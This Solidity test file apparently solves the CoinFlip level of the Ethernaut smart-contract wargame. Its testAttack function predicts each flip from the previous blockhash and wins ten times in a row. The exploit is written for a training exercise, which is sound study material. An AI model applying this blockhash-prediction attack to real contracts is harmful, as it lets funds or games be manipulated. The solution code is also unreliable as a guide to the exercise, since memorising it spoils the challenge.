// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./base/EthernautTest.sol";

// Set actual level contract file
import "../../src/3_CoinFlip.sol";

contract LevelTest is EthernautTest {

    function setUp() public {
        // Set actual level factory address
        levelSetUp(LEVEL_3_COINFLIP_ADDRESS, 0);

        // Additional setup
        vm.roll(block.number - 10);
    }

    function testAttack() public validateInstance {
        CoinFlip coinFlip = CoinFlip(levelInstance);

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        while(coinFlip.consecutiveWins() < 10) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 flip = blockValue / FACTOR;
            bool side = flip == 1 ? true : false;
            coinFlip.flip(side);
            
            // Emulate next block
            vm.roll(block.number + 1);
        }
    }
}